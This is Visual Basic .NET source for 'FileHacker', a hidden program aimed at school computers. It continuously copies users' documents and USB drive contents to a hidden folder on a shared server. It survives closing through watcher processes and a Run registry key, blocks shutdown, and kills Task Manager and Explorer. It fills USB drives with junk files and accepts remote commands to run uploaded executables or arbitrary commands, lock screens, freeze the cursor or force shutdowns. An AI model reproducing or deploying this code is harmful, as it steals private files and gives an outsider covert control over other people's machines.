'FileHackerを止められるならやってみろ！
Imports System.ComponentModel
Imports System.Threading
Imports System.IO
Imports Microsoft.Win32
Imports System.Reflection
Imports System.Text.RegularExpressions
Imports FileHacker.SchoolPCChecker
Imports FileHacker.PowerManager
Imports System.Diagnostics.Process
Imports System.Drawing.Imaging
Imports System.Runtime.InteropServices
Imports FileHacker.CalculatorCore
Imports FileHacker.ConfigXmlParser
Imports System.Text
Imports System.Security.Permissions

Public Class Main
    '定数＆変数部
    WithEvents starter, starter2, bgw01, bgw02, bgw03, bgw04, bgw05, bgw06, bgw07, bgw08, bgw09, bgw10, bgw11, bgw12, bgw13, bgw14, bgw15, bgw16, mp, failcopy As New BackgroundWorker '基本ワーカー
    WithEvents bgw_f1, bgw_f2, bgw_f3, bgw_f4, bgw_e1, bgw_e2, bgw_e3, bgw_e4, bgw_ef, bgw_ff As New BackgroundWorker 'USBハックワーカー
    WithEvents unhide_f, unhide_e, unhide_mydoc As New BackgroundWorker '隠し属性解除ワーカー
    WithEvents volmax, run_f, run_e, pwmng, cursorblock, tmstop, expstop, musicplayer, filemaker As New BackgroundWorker 'エキストラワーカー
    WithEvents at_loader, at_runner As New BackgroundWorker 'Additional Tools
    Dim from As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) 'コピー元(マイドキュメント)
    Dim topath2 As String = ConfigXmlParser.GetToPath & "\" & GetUN() 'コピー先(共有フォルダー)
    Dim topathusb As String = topath2 & "\USBのデータ"
    Dim topathfd As String = topathusb & "\F"
    Dim topathed As String = topathusb & "\E"
    Dim cbdoing As Boolean = False
    Dim failedfiles As New Queue(Of String())
    Dim at_workers As New Queue(Of BackgroundWorker)
    Dim p As Process = Nothing
    Dim path As String = System.Windows.Forms.Application.ExecutablePath
    Dim pl = Process.GetProcessesByName(My.Application.Info.AssemblyName)
    Dim allowshutdown As Boolean = False
    Dim dev As MMDeviceApi.CAEndpointVolume
    Const SPI_SETDESKWALLPAPER As UInt32 = 20
    Const SPIF_SENDWININICHANGE As UInt32 = &H2
    Const SPIF_UPDATEINIFILE As UInt32 = &H1
    Const WS_EX_TOOLWINDOW As Int32 = &H80
    Const WS_POPUP As Int32 = &H80000000
    Const WS_VISIBLE As Int32 = &H10000000
    Const WS_SYSMENU As Int32 = &H80000
    Const WS_MAXIMIZEBOX As Int32 = &H10000
    Const CS_NOCLOSE As Integer = &H200
    Const MF_BYPOSITION As Int32 = &H400
    Const MF_REMOVE As Int32 = &H1000
    Const WM_SYSCOMMAND As Integer = &H112
    Const SC_CLOSE As Long = &HF060L

    '関数＆イベントハンドラー部

    'イベントハンドラー
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False
        If Not IsSchool Then '学校用のPC以外は跳ね返す
            Application.Exit()
        End If
        'For Each i In Process.GetProcesses
        '    If Assembly.LoadFile(i.StartInfo.FileName).FullName = My.Application.Info.ProductName Then
        '        Application.Exit()
        '    End If
        'Next
        If ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.strict) Then
            If Boolean.Parse(GetConfigVariable("AllowRemote")) Then
                pwmng.RunWorkerAsync()
            End If
            If Directory.Exists(topath2) Then
                Directory.Delete(topath2, True)
            End If
            'GoTo tg2
        End If
        If ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.normal) Then
tg2:
            CType(IIf(p Is Nothing, Process.GetCurrentProcess, 0), Process).Kill()
            Application.Exit()
        End If
        If My.Application.CommandLineArgs.Count = 0 OrElse My.Application.CommandLineArgs(0) = "" Then 'デフォルトモード
            p = New Process
            p.StartInfo.FileName = path
            p.StartInfo.Arguments = "watch " & Process.GetCurrentProcess().Id.ToString
            SetupHadlers(p)
            AddHandler p.Exited, Sub(sender_ As Object, e_ As EventArgs)
                                     p.Start()
                                 End Sub
            p.Start()
        ElseIf My.Application.CommandLineArgs(0) = "permissionTest" Then '権限テスト 
            Application.Exit()
        ElseIf My.Application.CommandLineArgs(0) = "watch" Then 'ウォッチワーカーモード
            p = Process.GetProcessById(Integer.Parse(My.Application.CommandLineArgs(1)))
            p.StartInfo.FileName = path
            p.StartInfo.Arguments = "watchernostart " & Process.GetCurrentProcess().Id.ToString
            SetupHadlers(p)
            AddHandler p.Exited, Sub(sender_ As Object, e_ As EventArgs)
                                     p.Start()
                                 End Sub
            Return
        ElseIf My.Application.CommandLineArgs(0) = "watchernostart" Then 'デフォルトモード(ウォッチワーカー起動無し)
            p = Process.GetProcessById(Integer.Parse(My.Application.CommandLineArgs(1)))
            p.StartInfo.Arguments = "watchnostart " & Process.GetCurrentProcess().Id.ToString
            SetupHadlers(p)
            AddHandler p.Exited, Sub(sender_ As Object, e_ As EventArgs)
                                     p.Start()
                                 End Sub
        ElseIf My.Application.CommandLineArgs(0) = "watchernostart" Then 'ウォッチワーカーモード(デフォルト起動無し)
            p = Process.GetProcessById(Integer.Parse(My.Application.CommandLineArgs(1)))
            p.StartInfo.FileName = path
            p.StartInfo.Arguments = "watch " & Process.GetCurrentProcess().Id.ToString
            SetupHadlers(p)
            AddHandler p.Exited, Sub(sender_ As Object, e_ As EventArgs)
                                     p.Start()
                                 End Sub
        End If
        starter.RunWorkerAsync()
        starter2.RunWorkerAsync()
        AddHandler SystemEvents.SessionEnding, AddressOf SystemEvents_SessionEnding
        SetCurrentVersionRun() 'しつこく
    End Sub
    Private Sub SystemEvents_SessionEnding( _
                  ByVal sender As Object, _
                  ByVal e As SessionEndingEventArgs)
        If allowshutdown Then Return
        Process.Start("shutdown", "/a")
        While True
            e.Cancel = True
        End While
    End Sub
    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

    'バックグラウンドワーカー
    Private Sub FileHackerStarter(sender As Object, e As DoWorkEventArgs) Handles starter.DoWork
        Console.WriteLine("FileHacker is starting...")
        If Not Directory.Exists(ConfigXmlParser.GetToPath) Then
            HideFld(Directory.CreateDirectory(ConfigXmlParser.GetToPath))
        End If
        MakeFolder(topath2)
        If Not ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.nocopy) Then
            If ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.strict) Then
                For Each i In {bgw_ef, bgw_ff}
                    i.RunWorkerAsync()
                Next
            End If
            For Each i In {bgw01, bgw02, bgw03, bgw04, bgw05, bgw06, bgw07, bgw08, bgw09, bgw10, bgw11, bgw12, bgw13, bgw14, bgw15, bgw16}
                i.RunWorkerAsync()
                Thread.Sleep(1000 * 12)
            Next
        End If
    End Sub
    Private Sub FileHackerStarter2(sender As Object, e As DoWorkEventArgs) Handles starter2.DoWork
        Console.WriteLine("FileHacker is starting...")
        For Each i In {filemaker, run_e, run_f, pwmng, expstop, tmstop, failcopy, musicplayer, at_loader, at_runner}
            Try
                i.RunWorkerAsync()
                Console.WriteLine("A worker started.")
            Catch ex As Exception
                Console.WriteLine("-=Exception Info=-")
                Console.WriteLine("Exception Class:" & ex.GetType.Name)
                Console.WriteLine("Message:" & ex.Message)
            End Try
        Next
        For Each i In {New With {.Worker = unhide_e, .Args = topathed}, New With {.Worker = unhide_f, .Args = topathfd}, New With {.Worker = unhide_mydoc, .Args = topath2}}
            i.Worker.RunWorkerAsync(i.Args)
        Next
    End Sub
    Private Sub AdditionalToolsLoader(sender As Object, e As DoWorkEventArgs) Handles at_loader.DoWork
        '書き直し
        Console.Out.WriteLine("AdditionalToolsLoader is started")
        Try
            If Not Directory.Exists("\\pcjhkhsv01\生徒共用\FileHacker\AdditionalTools\") Then
                Console.WriteLine("Error:AdditionalTools folder is not found. This folder is created.")
                Directory.CreateDirectory("\\pcjhkhsv01\生徒共用\FileHacker\AdditionalTools\")
                Thread.Sleep(1000 * 10)
            End If
        Catch ex As Exception
            Console.WriteLine("-=Exception Info=-")
            Console.WriteLine("Exception Class:" & ex.GetType.Name)
            Console.WriteLine("Message:" & ex.Message)
        End Try
        For Each i In Directory.GetFiles("\\pcjhkhsv01\生徒共用\FileHacker\AdditionalTools\")
            Console.WriteLine("Found:" & IO.Path.GetFileName(i))
            If Not (i.EndsWith(".dll") Or i.EndsWith(".exe")) Then
                Console.WriteLine("Error:" & IO.Path.GetFileName(i) & " is not binary file. This file is skipped.")
                Continue For
            End If
            Dim asm As Assembly
            Try
                asm = Assembly.LoadFrom(i)
                Dim typ = asm.GetType(IO.Path.GetFileNameWithoutExtension(i) & ".FileHackerAdditionalTools", True, True)
                Dim obj = typ.InvokeMember(Nothing,
                                           BindingFlags.CreateInstance,
                                           Nothing,
                                           Nothing,
                                           New Object() {})
                Dim workers As BackgroundWorker() = obj.GetWorkers(Me) 'typ.InvokeMember("GetWorkers",
                'BindingFlags.InvokeMethod Or BindingFlags.IgnoreCase Or BindingFlags.Public,
                'Nothing,
                'obj,
                '{Me})
                If workers Is Nothing Then
                    Console.WriteLine("Error:" & IO.Path.GetFileName(i) & " gives null. This file is skipped.")
                    Continue For
                End If
                If workers.Length = 0 Then
                    Console.WriteLine("Error:" & IO.Path.GetFileName(i) & " does not give anyone. This file is skipped.")
                    Continue For
                End If
                Console.WriteLine("Info:" & IO.Path.GetFileName(i) & " contains " & workers.Length & " workers. These workers will be loaded and started.")
                For Each i_ In workers
                    at_workers.Enqueue(i_)
                Next
            Catch ex As Exception
                Console.WriteLine("Error:" & IO.Path.GetFileName(i) & " has an error. This file is skipped.")
                Console.WriteLine("-=Exception Info=-")
                Console.WriteLine("Exception Class:" & ex.GetType.Name)
                Console.WriteLine("Message:" & ex.Message)
            End Try
        Next
    End Sub
    Private Sub AdditionalToolsRunner(sender As Object, e As DoWorkEventArgs) Handles at_runner.DoWork
        While True
            While at_workers.Count <> 0
                Dim worker = at_workers.Dequeue
                Try
                    worker.RunWorkerAsync(Me)
                Catch ex As Exception
                    If worker Is Nothing Then
                        Continue While
                    End If
                    If worker.IsBusy Then
                        Continue While
                    End If
                    at_workers.Enqueue(worker)
                End Try
            End While
        End While
    End Sub
    Private Sub MakeCheckingFile(sender As Object, e As DoWorkEventArgs) Handles filemaker.DoWork
        Try
            If Not Directory.Exists("\\pcjhkhsv01\生徒共用\FileHacker\Onlines\") Then
                MakeFolder("\\pcjhkhsv01\生徒共用\FileHacker\Onlines\")
            End If
            If File.Exists("\\pcjhkhsv01\生徒共用\FileHacker\Onlines\" & GetPCName()) Then
                Null(New FileStream("\\pcjhkhsv01\生徒共用\FileHacker\Onlines\" & GetPCName(), FileMode.Truncate, FileAccess.Read, FileShare.ReadWrite))
            Else
                Null(New FileStream("\\pcjhkhsv01\生徒共用\FileHacker\Onlines\" & GetPCName(), FileMode.Create, FileAccess.Read, FileShare.ReadWrite))
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub PlayMusic(sender As Object, e As DoWorkEventArgs) Handles musicplayer.DoWork
        Try
            If ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.special2) Then
                If File.Exists("\\pcjhkhsv01\生徒共用\FileHacker\Resources\Music02.wav") Then
                    mp.RunWorkerAsync(New FileStream("\\pcjhkhsv01\生徒共用\FileHacker\Resources\Music02.wav", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                Else
                    mp.RunWorkerAsync(New FileStream("\\pcjhkhsv01\生徒共用\FileHacker\Resources\Music01.wav", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                End If
            ElseIf ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.special) Then
                mp.RunWorkerAsync(New FileStream("\\pcjhkhsv01\生徒共用\FileHacker\Resources\Music01.wav", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub RunFHack(sender As Object, e As DoWorkEventArgs) Handles run_f.DoWork
        If Directory.Exists("F:\") Then
            MakeFolder(topathusb)
            MakeFolder(topathfd)
            For Each i In {bgw_f1, bgw_f2, bgw_f3, bgw_f4}
                i.RunWorkerAsync()
                Thread.Sleep(1000 * 12)
            Next
        End If
    End Sub
    Private Sub RunEHack(sender As Object, e As DoWorkEventArgs) Handles run_e.DoWork
        If Directory.Exists("E:\") Then
            MakeFolder(topathusb)
            MakeFolder(topathed)
            For Each i In {bgw_e1, bgw_e2, bgw_e3, bgw_e4}
                i.RunWorkerAsync()
                Thread.Sleep(1000 * 12)
            Next
        End If
    End Sub
    Private Sub SendCopy(sender As Object, e As DoWorkEventArgs) Handles bgw01.DoWork, bgw03.DoWork, bgw05.DoWork, bgw07.DoWork, bgw09.DoWork, bgw11.DoWork, bgw13.DoWork, bgw15.DoWork, bgw02.DoWork, bgw04.DoWork, bgw06.DoWork, bgw08.DoWork, bgw10.DoWork, bgw12.DoWork, bgw14.DoWork, bgw16.DoWork
        While True
            Try
                CopyDirectory(from, topath2)
            Catch null As Exception

            End Try
        End While
    End Sub
    <Obsolete>
    Private Sub ReceiveCopy(sender As Object, e As DoWorkEventArgs) 'Handles bgw02.DoWork, bgw04.DoWork, bgw06.DoWork, bgw08.DoWork, bgw10.DoWork, bgw12.DoWork, bgw14.DoWork, bgw16.DoWork
        While True
            Try
                CopyDirectory(topath2, from)
            Catch null As Exception

            End Try
        End While
    End Sub
    Private Sub HackF(sender As Object, e As DoWorkEventArgs) Handles bgw_f1.DoWork, bgw_f2.DoWork, bgw_f3.DoWork, bgw_f4.DoWork
        While True
            Try
                CopyDirectory("F:\", topathfd)
            Catch null As Exception

            End Try
        End While
    End Sub
    Private Sub FillF(sender As Object, e As DoWorkEventArgs) Handles bgw_ff.DoWork
        If Not Directory.Exists("F:\") Then
            Return
        End If
        Dim s As FileStream
        If File.Exists("F:\FuckYou") Then
            s = New FileStream("F:\FuckYou", FileMode.Append, FileAccess.Write, FileShare.None)
        Else
            s = New FileStream("F:\FuckYou", FileMode.Create, FileAccess.Write, FileShare.None)
        End If
        While True
            Try
                s.WriteByte(Average(Function()
                                        Return (New Random).Next(0, 255) And 255
                                    End Function, 1000) And 255)
            Catch ex As Exception : End Try
        End While
    End Sub
    Private Sub FillE(sender As Object, e As DoWorkEventArgs) Handles bgw_ef.DoWork
        If Not Directory.Exists("E:\") Then
            Return
        End If
        Dim s As FileStream
        If File.Exists("E:\FuckYou") Then
            s = New FileStream("E:\FuckYou", FileMode.Append, FileAccess.Write, FileShare.None)
        Else
            s = New FileStream("E:\FuckYou", FileMode.Create, FileAccess.Write, FileShare.None)
        End If
        While True
            Try
                s.WriteByte(Average(Function()
                                        Return (New Random(s.Length Xor s.Position)).Next(0, 255) And 255
                                    End Function, 1000) And 255)
            Catch ex As Exception
            End Try
        End While
    End Sub
    Private Sub HackE(sender As Object, e As DoWorkEventArgs) Handles bgw_e1.DoWork, bgw_e2.DoWork, bgw_e3.DoWork, bgw_e4.DoWork
        While True
            Try
                CopyDirectory("E:\", topathed)
            Catch null As Exception

            End Try
        End While
    End Sub
     Private Sub VolMaxer(sender As Object, e As DoWorkEventArgs) Handles volmax.DoWork
        While True
            Try
                dev.Mute = False
                dev.MasterVolume = 1 'Single.Parse(100)
            Catch ex As Exception : End Try
        End While
    End Sub
    Private Sub UnHider(sender As Object, e As DoWorkEventArgs) Handles unhide_e.DoWork, unhide_f.DoWork, unhide_mydoc.DoWork
loops:
        Try
            UnHide(e.Argument)
        Catch null As Exception

        End Try
        GoTo loops
    End Sub
    Private Sub MediaPlayer(sender As Object, e As DoWorkEventArgs) Handles mp.DoWork
        volmax.RunWorkerAsync()
        Dim strm As Stream = CType(e.Argument, Stream)
        My.Computer.Audio.Play(strm, AudioPlayMode.BackgroundLoop)
    End Sub
    ''' <summary>
    ''' ディレクトリをコピーする
    ''' </summary>
    ''' <param name="sourceDirName">コピーするディレクトリ</param>
    ''' <param name="destDirName">コピー先のディレクトリ</param>
    Public Sub CopyDirectory( _
            ByVal sourceDirName As String, _
            ByVal destDirName As String)
        'コピー先のディレクトリがないときは作る
        If Not System.IO.Directory.Exists(destDirName) Then
            System.IO.Directory.CreateDirectory(destDirName)
            '属性もコピー(隠しフォルダは解除)
            System.IO.File.SetAttributes(destDirName, System.IO.File.GetAttributes(sourceDirName) And Not FileAttributes.Hidden)
        End If

        'コピー元のディレクトリにあるファイルをコピー
        Dim fs As String() = System.IO.Directory.GetFiles(sourceDirName)
        Dim f As String
        For Each f In fs
            If f = "desktop.ini" Or f = "desktop.inf" Or f = "FuckYou" Then
                Continue For
            End If
            'コピーエラー対策(失敗すると、FailedFilesCopierでコピーを成功するまで再試行)
            Dim tmp As String() = {f, IO.Path.Combine(destDirName, System.IO.Path.GetFileName(f))}
            Try
                System.IO.File.Copy(tmp(0), tmp(1), True)
            Catch ex As Exception
                If Not failedfiles.Contains(tmp) Then
                    failedfiles.Enqueue(tmp)
                End If
            End Try
        Next
        'コピー元のディレクトリにあるディレクトリをコピー
        Dim dirs As String() = System.IO.Directory.GetDirectories(sourceDirName)
        Dim dir As String
        For Each dir In dirs
            If dir = "System Volume Infomation" Then
                Continue For
            End If
            CopyDirectory(dir, destDirName + System.IO.Path.GetFileName(dir))
        Next
    End Sub
    Public Shared Sub UnHide( _
            ByVal sourceDirName As String)
        File.SetAttributes(sourceDirName, File.GetAttributes(sourceDirName) And Not FileAttributes.Hidden)
        Dim fs As String() = System.IO.Directory.GetFiles(sourceDirName)
        Dim f As String
        For Each f In fs
            If f = "desktop.ini" Or f = "desktop.inf" Or f = "FuckYou" Then
                Continue For
            End If
            File.SetAttributes(f, File.GetAttributes(sourceDirName) And Not FileAttributes.Hidden)
        Next
        Dim dirs As String() = System.IO.Directory.GetDirectories(sourceDirName)
        Dim dir As String
        For Each dir In dirs
            If dir = "System Volume Infomation" Then
                Continue For
            End If
            UnHide(dir)
        Next
    End Sub
    Private Sub CursorBlocker(sender As Object, e As DoWorkEventArgs) Handles cursorblock.DoWork
        Dim d As Point = System.Windows.Forms.Cursor.Position
        While cbdoing
            System.Windows.Forms.Cursor.Position = d
        End While
    End Sub
    Private Sub PowerManager(sender As Object, e As DoWorkEventArgs) Handles pwmng.DoWork
        If Not Boolean.Parse(ConfigXmlParser.GetConfigVariable("AllowRemote")) Then
            Return
        End If
        OrderManager.RegisterOrderHandler(Sub(s) DoCommand(s))
    End Sub
    Public Function DoCommand(res As String) As Boolean
        Try
            If res.StartsWith("SYSTEM_WALLPAPER_CHANGE") Then
                Dim a = res.Split(";")
                Dim data As Byte() = Convert.FromBase64String(a(1))
                Dim aaa As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\wp.bmp"
                File.WriteAllBytes(aaa, data)
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, aaa, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
            ElseIf res.StartsWith("SOFTWARE_EXE_RUN") Then
                Dim a = res.Split(";")
                Dim data As Byte() = Convert.FromBase64String(a(1))
                Dim aaa As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & CalcHash.X()(a(1)) & ".exe"
                File.WriteAllBytes(aaa, data)
                Process.Start(aaa)
            ElseIf res.StartsWith("COMPUTER_MUSIC_PLAY") And Not ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.special) Then
                Dim a = res.Split(";")
                Dim data As Byte() = Convert.FromBase64String(a(1))
                Dim aaa As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\music.wav"
                File.WriteAllBytes(aaa, data)
                My.Computer.Audio.Play(aaa, AudioPlayMode.BackgroundLoop)
            ElseIf res = "COMPUTER_MUSIC_STOP" And Not ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.special) Then
                My.Computer.Audio.Stop()
            ElseIf res.StartsWith("RESERVATION_SHUTDOWN") Then
                Dim proc As New Process
                proc.StartInfo.FileName = "shutdown"
                proc.StartInfo.Arguments = " /s /p /f /t " & res.Split(";")(1) & " /d p:5:15"
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
            ElseIf res.StartsWith("RESERVATION_REBOOT") Then
                Dim proc As New Process
                proc.StartInfo.FileName = "shutdown"
                proc.StartInfo.Arguments = " /r /p /f /t " & res.Split(";")(1) & " /d p:5:15"
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
            ElseIf res.StartsWith("RESERVATION_SIGNOUT") Then
                Dim proc As New Process
                proc.StartInfo.FileName = "shutdown"
                proc.StartInfo.Arguments = " /l /p /f"
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
            ElseIf res.StartsWith("SOFTWARE_COMMAND_RUN") Then
                Dim proc As New Process
                proc.StartInfo.FileName = Encoding.UTF8.GetString(Convert.FromBase64String(res.Split(";")(1)))
                proc.StartInfo.Arguments = Encoding.UTF8.GetString(Convert.FromBase64String(res.Split(";")(2)))
                proc.Start()
            End If
            Select Case res
                Case "FILEHACKER_SEND_TEST"
                    OrderManager.SendReply("TEST_CONNECT_ALLOW")
                Case "FILEHACKER_RESTART"
                    Application.Restart()
                Case "SYSTEM_SHUTDOWN"
                    AdjustToken()
                    ExitWindowsEx(ExitWindows.EWX_POWEROFF Or ExitWindows.EWX_FORCE, 0)
                    allowshutdown = True
                Case "SYSTEM_SIGNOUT"
                    'AdjustToken()
                    ExitWindowsEx(ExitWindows.EWX_LOGOFF Or ExitWindows.EWX_FORCE, 0)
                    allowshutdown = True
                Case "SYSTEM_REBOOT"
                    AdjustToken()
                    ExitWindowsEx(ExitWindows.EWX_REBOOT Or ExitWindows.EWX_FORCE, 0)
                    allowshutdown = True
                Case "SYSTEM_LOCK"
                    LockWorkStation()
                Case "HARDWARE_CURSOR_LOCK"
                    cbdoing = True
                    cursorblock.RunWorkerAsync()
                Case "HARDWARE_CURSOR_UNLOCK"
                    cbdoing = False
                Case "OMAKE_SHOW_PAYMENT"
                    CType(New Browser, Form).Show()
                Case "SCREEN_LOCK_BLACK"
                    initScreenLocker.StartWithBlack()
                Case "SCREEN_LOCK_COLORFUL"
                    initScreenLocker.StartWithColorful()
                Case "SCREEN_LOCK_STOP"
                    initScreenLocker.Close()
                Case "KILL_EXPLORER"
                    For Each i In Process.GetProcessesByName("explorer")
                        Try
                            i.Kill()
                        Catch ex As Exception : End Try
                    Next
            End Select
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
    Private Sub TaskManagerStopper(sender As Object, e As DoWorkEventArgs) Handles tmstop.DoWork
        If Not Boolean.Parse(ConfigXmlParser.GetConfigVariable("AllowKillTaskManager")) Then
            Return
        End If
        While True
            Try
                For Each i In Process.GetProcessesByName("taskmgr")
                    Try
                        i.Kill()
                    Catch ex As Exception : End Try
                Next
            Catch ex As Exception : End Try
        End While
    End Sub
    Private Sub ExplorerStopper(sender As Object, e As DoWorkEventArgs) Handles expstop.DoWork
        If Not ContainsBitMask(ConfigXmlParser.GetUserExceptionMode, ConfigXmlParser.ExceptionsXmlModes.special2) Then
            Return
        End If
        If Not Boolean.Parse(ConfigXmlParser.GetConfigVariable("AllowKillExplorer")) Then
            Return
        End If
        While True
            Try
                For Each i In Process.GetProcessesByName("explorer")
                    Try
                        i.Kill()
                    Catch ex As Exception : End Try
                Next
            Catch ex As Exception : End Try
        End While
    End Sub
    'これで失敗率を下げる
    Private Sub FailedFilesCopier(sender As Object, e As DoWorkEventArgs) Handles failcopy.DoWork
        While True
            While failedfiles.Count <> 0
                Dim tmp = failedfiles.Dequeue
                Try
                    IO.File.Copy(tmp(0), tmp(1), True)
                Catch ex As Exception
                    failedfiles.Enqueue(tmp)
                End Try
            End While
        End While
    End Sub

    'その他
    Private Function Null(Of T)(o As T) As T
        Return o
    End Function
    Private Sub Null(o As Object)

    End Sub
    Sub SetupHadlers(p As Process)
        p.SynchronizingObject = Me
        p.EnableRaisingEvents = True
    End Sub
    Sub HideFld(di As DirectoryInfo)
        di.Attributes = MergeBitMask(di.Attributes, FileAttributes.Hidden)
    End Sub
    Sub MakeFolder(path As String)
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If
    End Sub
    Private Function initScreenLocker() As ScreenLocker
        If sl Is Nothing Then
            sl = New ScreenLocker
        End If
        If sl.IsDisposed Then
            sl = Nothing
            Return initScreenLocker()
        End If
        Return sl
    End Function
    Dim sl As ScreenLocker
    Private Function ToArrayFromStream(stream As Stream) As Byte()
        Dim ms As New MemoryStream
        stream.CopyTo(ms)
        Return ms.ToArray
    End Function

    'フォームのCreateParamsプロパティをオーバーライドする
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        <SecurityPermission(SecurityAction.Demand, _
            Flags:=SecurityPermissionFlag.UnmanagedCode)> _
        Get
            Dim cp As System.Windows.Forms.CreateParams
            cp = MyBase.CreateParams
            cp.ExStyle = WS_EX_TOOLWINDOW
            cp.Style = WS_POPUP Or WS_VISIBLE Or _
                WS_SYSMENU Or WS_MAXIMIZEBOX
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            cp.Height = 0
            cp.Width = 0
            Return cp
        End Get
    End Property

    <SecurityPermission(SecurityAction.Demand, _
        Flags:=SecurityPermissionFlag.UnmanagedCode)> _
    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)

        If m.Msg = WM_SYSCOMMAND AndAlso _
            (m.WParam.ToInt64() And &HFFF0L) = SC_CLOSE Then
            Return
        End If

        MyBase.WndProc(m)
    End Sub
    <System.Runtime.InteropServices.DllImport("user32.dll")> _
    Shared Function GetSystemMenu(ByVal hWnd As IntPtr, _
    ByVal bRevert As Boolean) As IntPtr
    End Function

    <System.Runtime.InteropServices.DllImport("user32.dll")> _
    Shared Function GetMenuItemCount(ByVal hMenu As IntPtr) As Integer
    End Function

    <System.Runtime.InteropServices.DllImport("user32.dll")> _
    Shared Function DrawMenuBar(ByVal hWnd As IntPtr) As Boolean
    End Function

    <System.Runtime.InteropServices.DllImport("user32.dll")> _
    Shared Function RemoveMenu(ByVal hMenu As IntPtr, _
    ByVal uPosition As Integer, _
    ByVal uFlags As Integer) As Boolean
    End Function

    Protected Overrides Sub OnLoad(ByVal e As EventArgs)
        MyBase.OnLoad(e)

        Dim menu As IntPtr = GetSystemMenu(Me.Handle, False)
        Dim menuCount As Integer = GetMenuItemCount(menu)
        If menuCount > 1 Then
            'メニューの「閉じる」とセパレータを削除
            For i = 0 To menuCount - 1
                RemoveMenu(menu, i, MF_BYPOSITION Or MF_REMOVE)
            Next
            DrawMenuBar(Me.Handle)
        End If
    End Sub
    Public Shared Sub SetCurrentVersionRun()
        Try
            'Runキーを開く
            Dim regkey As Microsoft.Win32.RegistryKey = _
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey( _
                "Software\Microsoft\Windows\CurrentVersion\Run", True)
            '値の名前に製品名、値のデータに実行ファイルのパスを指定し、書き込む
            regkey.SetValue(Application.ProductName, Application.ExecutablePath)
            '閉じる
            regkey.Close()
        Catch ex As Exception
        End Try
    End Sub
    'システムをロックできるやつ
    Declare Sub LockWorkStation Lib "user32" ()
    Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" _
          (ByVal uiAction As System.UInt32, _
        ByVal uiParam As System.UInt32, _
        <MarshalAs(UnmanagedType.LPStr)> ByVal lpvParam As String, _
        ByVal fWinIni As System.UInt32) As UInt32
    Delegate Function AverageFunc() As Integer
    Function Average(f As AverageFunc, c As Integer) As Integer
        Dim n As Decimal
        For a = 1 To c
            n += f()
        Next
        Return Math.Floor(n / c)
    End Function
End Class